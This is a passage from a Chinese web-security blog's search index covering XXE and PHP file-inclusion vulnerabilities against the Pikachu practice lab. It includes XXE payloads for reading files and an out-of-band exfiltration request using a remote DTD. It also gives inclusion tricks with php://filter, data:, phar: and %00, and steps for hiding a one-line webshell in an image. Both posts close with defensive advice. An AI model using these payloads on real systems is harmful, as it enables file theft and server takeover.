class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/WWW/99.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br>将99.txt文件内容显示出来<br></code></pre></td></tr></table></figure><h5 id="例题-皮卡丘靶场例题-读config-inc-php文件"><a href="#例题-皮卡丘靶场例题-读config-inc-php文件" class="headerlink" title="例题:皮卡丘靶场例题,读config.inc.php文件"></a>例题:皮卡丘靶场例题,读config.inc.php文件</h5><h5 id="使用php-x2F-x2F-filter-x2F-read来转化"><a href="#使用php-x2F-x2F-filter-x2F-read来转化" class="headerlink" title="使用php:&#x2F;&#x2F;filter&#x2F;read来转化"></a>使用php:&#x2F;&#x2F;filter&#x2F;read来转化</h5><p>有回显(使用base64)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/WWW/pikachu-master/inc/config.inc.php&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="有回显-明文"><a href="#有回显-明文" class="headerlink" title="有回显(明文)"></a>有回显(明文)</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/WWW/pikachu-master/1.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XXE无回显的利用"><a href="#XXE无回显的利用" class="headerlink" title="XXE无回显的利用"></a>XXE无回显的利用</h5><p>发送给漏洞服务器的包(无回显时也可用)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vul/xxe/xxe_1.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.pikachu.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>287<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://www.pikachu.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.pikachu.com/vul/xxe/xxe_1.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=38avn1v46f2n43a3qe8hrr5u73<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-mojolicious"><span class="language-xml">xml=<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="language-xml"><span class="language-mojolicious"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/WWW/pikachu-master/inc/config.inc.php&quot;</span>&gt;</span></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.localhost.com/xxe_file.dtd&quot;</span>&gt;</span></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"></span></span><span class="language-perl">%dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious">]&gt;</span>&amp;submit=%E6%8F%90%E4%BA%A4</span></span><br></code></pre></td></tr></table></figure><h5 id="如何挖掘XXE"><a href="#如何挖掘XXE" class="headerlink" title="如何挖掘XXE"></a>如何挖掘XXE</h5><p>1.手工测试</p><ol><li>有回显XXE:<ol><li>观察请求头Accept字段是否有application&#x2F;xml, text&#x2F;xml等</li><li>提交一个POST请求，请求头加上Content-type:application&#x2F;xml</li><li>提交一个简单的xml测试语句，查看打印结果</li></ol></li><li>无回显XXE<ol><li>提交测试数据</li><li>利用http协议访问攻击主机，然后查看访问日志确定是否存在XXE</li><li>或者利用dnslog，地址: <a href="http://www.dnslog.cnl/">http://www.dnslog.cnl</a></li></ol></li></ol><p>2.代码审计</p><p>3.工具自动化注入</p><h5 id="XXE的防御"><a href="#XXE的防御" class="headerlink" title="XXE的防御"></a>XXE的防御</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">方案一：使用开发语言提供的禁用外部实体的方法<br>PHP<br>libxml<span class="hljs-constructor">_disable_entity_loader(<span class="hljs-params">true</span>)</span>;<br><br>JAVA<br>DocumentBuilderFactory dbf =<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DocumentBuilderFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>dbf.set<span class="hljs-constructor">ExpandEntityReferences(<span class="hljs-params">false</span>)</span>;<br><br>Python:<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.<span class="hljs-constructor">XMLParser(<span class="hljs-params">resolve_entities</span>=False)</span>)<br><br>方案二：过滤用户提交的XML数据<br>过滤关键词&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2022/10/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/10/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。</p><span id="more"></span><h5 id="文件包含漏洞原理"><a href="#文件包含漏洞原理" class="headerlink" title="文件包含漏洞原理"></a>文件包含漏洞原理</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">文件包含漏洞产生的原因是在通过引入文件时，包含的文件名是用户可控的,由于传入的文件名没有经过合理的校验，或者校验被绕过。<br></code></pre></td></tr></table></figure><h5 id="文件包含漏洞的形成-需要满足两个条件"><a href="#文件包含漏洞的形成-需要满足两个条件" class="headerlink" title="文件包含漏洞的形成,需要满足两个条件"></a>文件包含漏洞的形成,需要满足两个条件</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span><span class="hljs-keyword">include</span>()等函数通过动态变量的方式引入需要包含的文件<br><span class="hljs-number">2.</span>用户能够控制这个动态变量<br></code></pre></td></tr></table></figure><h5 id="PHP中常见包含文件函数"><a href="#PHP中常见包含文件函数" class="headerlink" title="PHP中常见包含文件函数"></a>PHP中常见包含文件函数</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">include_once</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">require_once</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">fopen</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><h5 id="文件包含漏洞的危害"><a href="#文件包含漏洞的危害" class="headerlink" title="文件包含漏洞的危害"></a>文件包含漏洞的危害</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">敏感信息泄露<br>获取<span class="hljs-keyword">shell</span><span class="language-bash"></span><br><span class="language-bash">任意命令执行</span><br></code></pre></td></tr></table></figure><h5 id="require和include两个函数的区别"><a href="#require和include两个函数的区别" class="headerlink" title="require和include两个函数的区别"></a>require和include两个函数的区别</h5><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">include</span>:包含的文件不存在时,程序会继续执行<br><span class="hljs-built_in">require</span>:包含的文件不存在时,程序停止执行<br>(如果出现语法错误，两个不会继续执行，如果是找不到这个文件，<span class="hljs-built_in">include</span>继续执行，<span class="hljs-built_in">require</span>，停止执行)<br></code></pre></td></tr></table></figure><h3 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">本地文件包含      fopen<br>远程文件包含<span class="hljs-meta"><span class="hljs-keyword">include</span></span><br></code></pre></td></tr></table></figure><h5 id="本地文件包含利用"><a href="#本地文件包含利用" class="headerlink" title="本地文件包含利用"></a>本地文件包含利用</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">上传图片马，包含图片马GetShell<br>读取网站源码以及配置文件<br>包含日志文件GetShell<br>包含session文件拿<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-number">1</span>.当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。<br><span class="hljs-number">2</span>.本地文件包含和远程文件包含造成漏洞的原因是一样的，当php.ini中的配置选项allow_url_fopen和allow_url_include为<span class="hljs-keyword">ON</span>的话，则包含的文件可以是第三方服务器中的文件，这样就形成了远程文件包含漏洞。(fopen默认是打开的,本地的;<span class="hljs-keyword">include</span>是远程)<br></code></pre></td></tr></table></figure><p>截断符号</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haml">?<br><span class="hljs-tag">%<span class="hljs-selector-tag">23</span></span><br></code></pre></td></tr></table></figure><h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">第一种：<br>file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);            <span class="hljs-regexp">//</span>任意文件读取<br><br>第二种:<br><span class="hljs-variable">$a</span> = fopen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>],<span class="hljs-string">&#x27;r&#x27;</span>);<br>echo fread(<span class="hljs-variable">$a</span>,<span class="hljs-number">200</span>)                          <span class="hljs-regexp">//</span><span class="hljs-number">200</span>是读取长度   <br></code></pre></td></tr></table></figure><h3 id="文件包含相关协议"><a href="#文件包含相关协议" class="headerlink" title="文件包含相关协议"></a>文件包含相关协议</h3><h5 id="php-x2F-x2F-fileter-读取"><a href="#php-x2F-x2F-fileter-读取" class="headerlink" title="php:&#x2F;&#x2F;fileter       读取"></a>php:&#x2F;&#x2F;fileter       读取</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">allow_url_fopen=<span class="hljs-keyword">On</span>      ,     allow_url_include=<span class="hljs-keyword">On</span>/<span class="hljs-keyword">Off</span><br>php://<span class="hljs-keyword">filter</span>/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=文件路径名<br></code></pre></td></tr></table></figure><h5 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">allow_url_fopen=<span class="hljs-keyword">On</span>/<span class="hljs-keyword">Off</span>   ,    allow_url_include=<span class="hljs-keyword">On</span><br>需要<span class="hljs-keyword">GET</span>提交,在BP转换成[POST提交]<br></code></pre></td></tr></table></figure><h5 id="data-text-x2F-plain"><a href="#data-text-x2F-plain" class="headerlink" title="data:text&#x2F;plain"></a>data:text&#x2F;plain</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_fopen=On      ,     allow_url_include=On<br>用法<span class="hljs-number">1</span>: ?file=data:text/plain,<span class="hljs-meta">&lt;?php</span>执行内容<span class="hljs-meta">?&gt;</span><br>用法<span class="hljs-number">2</span>: ?file=data:text/plain;base64,编码后的php代码<br>注意base64加密之后的代码,不能够有+号,否则会和url中的+编码冲突<br></code></pre></td></tr></table></figure><h5 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">使用zip协议，需要将<span class="hljs-comment">#编码改为%23，所以需要PHP的版本&gt; =5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23</span><br>zip:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.zip%<span class="hljs-number">231</span>.txt<br>zip:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.jpg%<span class="hljs-number">231</span>.txt<br></code></pre></td></tr></table></figure><h5 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h5><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">file</span>:<span class="hljs-comment">//可以用来访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。</span><br>用法：?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">file</span>:<span class="hljs-comment">//文件绝对路径</span><br></code></pre></td></tr></table></figure><h5 id="Phar-x2F-x2F-反序列化漏洞"><a href="#Phar-x2F-x2F-反序列化漏洞" class="headerlink" title="Phar:&#x2F;&#x2F;(反序列化漏洞)"></a>Phar:&#x2F;&#x2F;(反序列化漏洞)</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">用法:?<span class="hljs-keyword">file</span>=phar:<span class="hljs-comment">//压缩包/内部文件示例:</span><br>phar:<span class="hljs-comment">//xxx.png/shell.php</span><br>注意:PHP &gt;= 5.3.0压缩包需要是<span class="hljs-keyword">zip</span>协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br>步骤:写一个一句话木马文件<span class="hljs-keyword">shell</span>.php，然后用<span class="hljs-keyword">zip</span>协议压缩为<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">zip</span>,然后将后缀改为png等其他格式。<br></code></pre></td></tr></table></figure><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">需要magic_quotes_gpc=<span class="hljs-keyword">off</span>,<br>PHP小于<span class="hljs-number">5.3</span>.<span class="hljs-number">4</span>有效<br>用法: <span class="hljs-keyword">test</span>.jpg%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h5 id="伪协议包含的类型总结"><a href="#伪协议包含的类型总结" class="headerlink" title="伪协议包含的类型总结"></a>伪协议包含的类型总结</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span>访问本地文件系统<br>http:<span class="hljs-regexp">//</span>访问 HTTPs 网址<br>Php:<span class="hljs-regexp">//</span>访问输入输出流<br>Zib:<span class="hljs-regexp">//</span>压缩流<br>Data:<span class="hljs-regexp">//</span>数据<br>Phar:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><h4 id="文件包含漏洞防御"><a href="#文件包含漏洞防御" class="headerlink" title="文件包含漏洞防御"></a>文件包含漏洞防御</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> 设置白名单<br>   代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。<br><span class="hljs-number">2.</span> 过滤危险字符<br>   由于<span class="hljs-keyword">Include</span>/Require可以对PHP <span class="hljs-keyword">Wrapper</span>形式的地址进行包含执行（需要配置php.ini)，在Linux环境中可以通过&quot;../../&quot;&quot;的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。<br>3. 设置文件目录<br>   PHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。<br>4. 关闭危险配置(禁止远程文件包含)<br>   PHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>test123</title>
    <link href="/2022/10/01/test123/"/>
    <url>/2022/10/01/test123/</url>
    
    <content type="html"><![CDATA[<p>112233</p><p><img src="/../images/test123/image-20221026105758264.png" alt="0"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
